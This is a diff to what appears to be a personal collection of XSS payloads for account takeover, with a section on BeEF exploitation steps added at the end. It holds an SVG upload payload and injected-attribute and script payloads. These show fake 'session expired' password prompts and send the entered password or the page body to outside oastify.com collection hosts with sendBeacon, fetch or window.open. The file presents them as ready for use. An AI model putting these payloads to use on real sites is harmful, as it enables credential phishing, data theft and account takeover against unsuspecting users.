@@ -1,5 +1,6 @@
 Below are the XSS Payload which can be used for ACCOUNT TAKEOVER :)
 
+Payload for SVG File Upload:
 
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
@@ -13,8 +14,7 @@ javascript:var xssinput = prompt("Your session has timed out. Please re-enter yo
 </svg>
 
 ----------------
-
-22q14em"onfocus="var abc=prompt('Session Expired. Please enter your password to log in again.');navigator.sendBeacon('http://mkatx18p1ae9309rxold.oastify.com/',document.body.innerHTML);"autofocus="bze4jg3pyc9
+4em"onfocus="var abc=prompt('Session Expired. Please enter your password to log in again.');navigator.sendBeacon('http://mkatx18p1ae9309rxold.oastify.com/',document.body.innerHTML);"autofocus="bze4j
 
 ----------------
 
@@ -36,17 +36,17 @@ fetch('https://lynsj5gondvwhls6p0dq1f.oastify.com',{method:'POST',body:passme});
 
 ---------------
 
-<script type="text/javascript"><![CDATA[
-    var xssinput = prompt('Your session has timed out. Please re-enter your password to resume');
-    if (xssinput) {
-      var url = 'https://2x0u9d4vqnol23brafz.oastify.com/foo?p=' + xssinput;
-      window.open(url);
-    }
-  </script>
-
-  -----------------------------------BeEF Exploitation--------------------------------
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+  -----------------------------------BeEF Exploitation Steps--------------------------------
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+What is BeEF?
+______________
 
 The Browser Exploitation Framework is abbreviated as BeEF. It is a web browser-specific penetration testing tool. Because BeEF employs JavaScript, it is simpler for us to inject codes into XSS-vulnerable pages, and those scripts will be performed each time a user attempts to access the page.
+
+Steps for Exploitation:
+_______________________
+
 
 1. Start the BeEF service on Kali: Use the command "sudo beef-xss start" to initiate the BeEF service.
 
